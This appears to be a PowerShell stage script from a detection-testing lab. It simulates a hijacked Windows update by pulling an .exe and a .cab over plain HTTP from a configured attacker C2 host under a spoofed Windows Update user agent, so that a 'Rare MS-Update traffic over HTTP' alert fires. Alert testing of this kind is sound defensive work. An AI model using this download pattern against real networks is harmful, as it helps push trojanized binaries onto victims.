<#
    Stage 3 (MIDDLE) - MS-Update over HTTP (abnormal characteristics)
    ================================================================
    The rogue "update" is delivered over plain HTTP with abnormal request
    characteristics - the vector for pushing a trojanized Microsoft binary.

      EAL alert : 'Rare MS-Update traffic over HTTP'  (rule a3602352)
      ATT&CK    : Lateral Movement (TA0008) / Exploitation of Remote Services (T1210)
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_net.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

$srv = $cfg.AttackerC2
$ua  = "Windows-Update-Agent"
Write-Stage "STAGE 3 (Update hijack): trojanized update download over HTTP from $srv" "INFO"
Invoke-Http -Url "http://$srv/Content/Updates/update-KB5099999.exe" -UserAgent $ua -Label "update payload (http)"
Invoke-Http -Url "http://$srv/Content/Updates/patch.cab"            -UserAgent $ua `
            -Headers @{ "Range"="bytes=0-2097151" } -Label "update chunk (http)"
Invoke-Http -Url "http://$srv/ClientWebService/client.asmx" -Method "POST" -UserAgent $ua `
            -Headers @{ "SOAPAction"="http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates" } `
            -Body "<SyncUpdates/>" -Label "SyncUpdates (http)"
Write-Stage "STAGE 3 done. Expect EAL: 'Rare MS-Update traffic over HTTP' (rule a3602352)." "OK"
